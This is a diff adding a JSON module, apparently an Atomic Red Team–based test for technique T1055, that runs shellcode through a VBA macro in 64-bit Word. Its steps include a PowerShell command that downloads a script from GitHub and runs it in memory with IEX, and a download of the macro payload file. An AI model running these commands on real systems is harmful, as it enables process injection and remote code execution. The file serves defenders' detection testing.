@@ -1,0 +1,139 @@
+{
+  "id": "1c91e740-1729-4329-b779-feba6e71d048",
+  "name": "Shellcode execution via VBA",
+  "description": "This module injects shellcode into a newly created process and executes. By default the shellcode is created,\nwith Metasploit, for use on x86-64 Windows 10 machines.\n\nNote: Due to the way the VBA code handles memory/pointers/injection, a 64bit installation of Microsoft Office\nis required.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "5f689738-fb7a-4ace-96e4-faaf531c6a98",
+      "type": "execute-command",
+      "data": {
+        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"#{txt_path}\" -officeProduct \"Word\" -sub \"Execute\"\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "d385d968-0e78-473c-a9df-51e55776290e",
+      "name": "Check dependency 1/2",
+      "description": "The 64-bit version of Microsoft Office must be installed\n",
+      "type": "execute-command",
+      "data": {
+        "command": "try {\n  $wdApp = New-Object -COMObject \"Word.Application\"\n  $path = $wdApp.Path\n  Stop-Process -Name \"winword\"\n  if ($path.contains(\"(x86)\")) { exit 1 } else { exit 0 }\n} catch { exit 1 }\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "fc46c010-be96-422b-867a-1bf7e27ad8b6",
+      "name": "Resolve dependency 1/2",
+      "description": "The 64-bit version of Microsoft Office must be installed\n",
+      "type": "execute-command",
+      "data": {
+        "command": "Write-Host \"You will need to install Microsoft Word (64-bit) manually to meet this requirement\"\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "962007c7-923b-4534-8cbe-d43a49006308",
+      "name": "Re-check dependency 1/2",
+      "description": "The 64-bit version of Microsoft Office must be installed\n",
+      "type": "execute-command",
+      "data": {
+        "command": "try {\n  $wdApp = New-Object -COMObject \"Word.Application\"\n  $path = $wdApp.Path\n  Stop-Process -Name \"winword\"\n  if ($path.contains(\"(x86)\")) { exit 1 } else { exit 0 }\n} catch { exit 1 }\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "0fcea6b2-c33e-4da5-bea8-8024d1b53e68",
+      "name": "Check dependency 2/2",
+      "description": "\"#{txt_path}\" must exist on disk at specified location\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"#{txt_path}\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "af208f62-c2a6-48a9-9c88-f8e27f47fde1",
+      "name": "Resolve dependency 2/2",
+      "description": "\"#{txt_path}\" must exist on disk at specified location\n",
+      "type": "execute-command",
+      "data": {
+        "command": "New-Item -Type Directory (split-path \"#{txt_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055/src/x64/T1055-macrocode.txt\" -OutFile \"#{txt_path}\" -UseBasicParsing\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "08e6ad85-a414-4200-bf2e-b4499cc8a0b0",
+      "name": "Re-check dependency 2/2",
+      "description": "\"#{txt_path}\" must exist on disk at specified location\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"#{txt_path}\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "d385d968-0e78-473c-a9df-51e55776290e",
+      "p": "on-success",
+      "o": "5f689738-fb7a-4ace-96e4-faaf531c6a98"
+    },
+    {
+      "s": "d385d968-0e78-473c-a9df-51e55776290e",
+      "p": "on-failure",
+      "o": "fc46c010-be96-422b-867a-1bf7e27ad8b6"
+    },
+    {
+      "s": "fc46c010-be96-422b-867a-1bf7e27ad8b6",
+      "p": "on-success",
+      "o": "962007c7-923b-4534-8cbe-d43a49006308"
+    },
+    {
+      "s": "962007c7-923b-4534-8cbe-d43a49006308",
+      "p": "on-failure",
+      "o": "5f689738-fb7a-4ace-96e4-faaf531c6a98"
+    },
+    {
+      "s": "0fcea6b2-c33e-4da5-bea8-8024d1b53e68",
+      "p": "on-success",
+      "o": "5f689738-fb7a-4ace-96e4-faaf531c6a98"
+    },
+    {
+      "s": "0fcea6b2-c33e-4da5-bea8-8024d1b53e68",
+      "p": "on-failure",
+      "o": "af208f62-c2a6-48a9-9c88-f8e27f47fde1"
+    },
+    {
+      "s": "af208f62-c2a6-48a9-9c88-f8e27f47fde1",
+      "p": "on-success",
+      "o": "08e6ad85-a414-4200-bf2e-b4499cc8a0b0"
+    },
+    {
+      "s": "08e6ad85-a414-4200-bf2e-b4499cc8a0b0",
+      "p": "on-failure",
+      "o": "5f689738-fb7a-4ace-96e4-faaf531c6a98"
+    }
+  ],
+  "tags": [
+    "T1055",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "txt_path",
+      "type": "path",
+      "description": "Path to file containing VBA macro to run",
+      "value": "PathToAtomicsFolder\\T1055\\src\\x64\\T1055-macrocode.txt"
+    }
+  ]
+}
